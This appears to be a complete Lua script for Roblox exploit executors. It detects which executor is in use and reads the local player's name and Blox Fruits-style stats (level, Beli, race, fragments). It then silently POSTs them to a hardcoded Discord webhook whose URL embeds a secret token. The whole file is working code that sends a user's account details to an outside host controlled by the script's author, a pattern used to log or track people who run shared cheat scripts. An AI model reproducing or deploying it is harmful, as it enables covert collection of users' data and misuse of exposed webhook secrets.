local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"
--local
local pl_Name = game.Players.LocalPlayer.Name
-- data
local Level = game.Players.LocalPlayer.Data.Level.value
local Beli = game.Players.LocalPlayer.Data.Beli.value
local Race = game.Players.LocalPlayer.Data.Race.value
local Fragment = game.Players.LocalPlayer.Data.Fragments.value

local url =
   "https://discordapp.com/api/webhooks/963673282438111272/QkXNYvG5-dAvTBAOJRcln6qUlgz7VC1hbbCz6ySJEiRlhA6Y44XiA5tfo_jfZXd7wnEJ"



local data = {
   ["embeds"] = {
       {
           ["color"] = tonumber(0x7269da),
           ["title"] = "Account: ".. "||**" .. game.Players.LocalPlayer.Name .. "**||",
           ["description"] = "📈 Level: " .. "**__" .. Level .. "__**",
           ['fields'] = {
					{
							['name'] = "Beli: ",
							['value'] = "**" ..  Beli .. "**" .. " 💸",

					},
          {
              ['name'] = "Race: ",
					    ['value'] = "**" ..  Race .. "**",

          },
          {
              ['name'] = "Fragment: ",
					    ['value'] = "**" ..  Fragment .. "**",

          },
				}
       }
   }

}



  
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
